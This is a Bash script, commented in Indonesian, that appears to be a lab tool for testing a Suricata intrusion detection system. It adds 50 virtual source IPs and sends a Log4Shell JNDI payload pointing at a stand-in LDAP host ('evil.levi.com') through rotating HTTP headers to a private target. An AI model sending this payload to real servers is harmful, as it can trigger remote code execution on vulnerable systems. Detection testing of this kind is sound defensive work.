#!/usr/bin/env bash
# =============================================================================
#  attack_sim.sh — Simulasi Serangan Multi-IP untuk Menguji Suricata
#  Author  : Levi (github.com/LEVI6957)
#  Usage   : sudo bash attack_sim.sh
# =============================================================================

# ── Warna ─────────────────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

# ── Konfigurasi ───────────────────────────────────────────────────────────────
TARGET_IP="192.168.216.128"
TARGET_PORT="80"
TARGET="http://${TARGET_IP}:${TARGET_PORT}"

# Deteksi interface jaringan utama secara otomatis
IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
if [[ -z "$IFACE" ]]; then
    IFACE="eth0"
fi

# Ambil IP address dari interface tersebut (IP asli Kali)
KALI_IP=$(ip -o -4 addr show dev "$IFACE" | awk '{print $4}' | cut -d/ -f1 | head -n1)

# !! PENTING: Gunakan subnet BERBEDA dari jaringan lokal !!
# Agar Suricata mendeteksi sebagai EXTERNAL_NET
IP_BASE="10.66.66"

# Range IP virtual yang akan dibuat
IP_START=50
IP_COUNT=50
DELAY=0.1

# ── Fungsi Helper ─────────────────────────────────────────────────────────────
info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
attack()  { echo -e "${RED}[ATK]${NC}   $*"; }
success() { echo -e "${CYAN}[OK]${NC}    $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════${NC}";
            echo -e "${BOLD}${BLUE}  $*${NC}";
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}\n"; }

[[ $EUID -ne 0 ]] && echo -e "${RED}[ERROR]${NC} Jalankan dengan sudo: sudo bash attack_sim.sh" && exit 1

cleanup() {
    echo ""
    warn "Membersihkan IP virtual..."
    ip route del "${IP_BASE}.0/24" dev "$IFACE" 2>/dev/null || true
    for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
        ip addr del "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
    done
    success "Semua IP virtual dihapus. Bersih!"
}
trap cleanup EXIT

header "🔥 SURICATA ATTACK SIMULATOR (50 IP)"
echo -e "  Target    : ${BOLD}${TARGET}${NC}"
echo -e "  Interface : ${BOLD}${IFACE}${NC}"
echo -e "  IP Range  : ${BOLD}${IP_BASE}.${IP_START} - ${IP_BASE}.$((IP_START + IP_COUNT - 1))${NC}"
echo ""
warn "PASTIKAN SUDAH JALANKAN INI DI UBUNTU SERVER:"
echo -e "  ${BOLD}sudo ip route add ${IP_BASE}.0/24 via ${KALI_IP}${NC}"
echo ""
read -rp "$(echo -e ${YELLOW}[?]${NC}) Lanjut? (y/N): " confirm
[[ "${confirm,,}" != "y" ]] && echo "Dibatalkan." && exit 0

header "1. Membuat IP Virtual"
> attackers.txt
info "Mencatat IP penyerang ke attackers.txt"

for i in $(seq $IP_START $((IP_START + IP_COUNT - 1))); do
    ip addr add "${IP_BASE}.${i}/24" dev "$IFACE" 2>/dev/null
    echo "${IP_BASE}.${i}" >> attackers.txt
done
success "50 IP virtual berhasil dibuat!"

ip route add "${IP_BASE}.0/24" dev "$IFACE" 2>/dev/null || true
sleep 1

header "2. Memulai Simulasi Serangan (3x Request / IP)"

HEADERS=("X-Api-Version" "User-Agent" "X-Forwarded-For" "Referer" "X-Client-IP" "X-Real-IP")
PAYLOAD='${jndi:ldap://evil.levi.com/exploit}'

for i in $(seq 0 $((IP_COUNT - 1))); do
    SRC_IP="${IP_BASE}.$((IP_START + i))"
    HDR_IDX=$((i % ${#HEADERS[@]}))
    HDR="${HEADERS[$HDR_IDX]}"

    echo -ne "${RED}[ATK]${NC} Log4Shell dari ${BOLD}${SRC_IP}${NC} (Kirim 3x)...\r"
    
    # Kirim 3 request berurutan (tanpa background agar lebih terkontrol)
    for hit in {1..3}; do
        curl -s --max-time 2 --connect-timeout 2 \
            --interface "$SRC_IP" \
            -H "${HDR}: ${PAYLOAD}" \
            "${TARGET}/" -o /dev/null 2>/dev/null
    done
    echo -e "${RED}[ATK]${NC} Log4Shell dari ${BOLD}${SRC_IP}${NC} (Kirim 3x) -> Selesai."
    
    sleep "$DELAY"
done

header "✅ Simulasi Selesai!"

info "Menyimpan attack_metadata.json..."
cat <<EOF > attack_metadata.json
{
  "test_date": "$(date -u +'%Y-%m-%dT%H:%M:%SZ')",
  "attack_type": "Log4Shell via HTTP Headers (3x per IP)",
  "total_attackers": ${IP_COUNT},
  "target_ip": "${TARGET_IP}"
}
EOF
success "Log tersimpan."
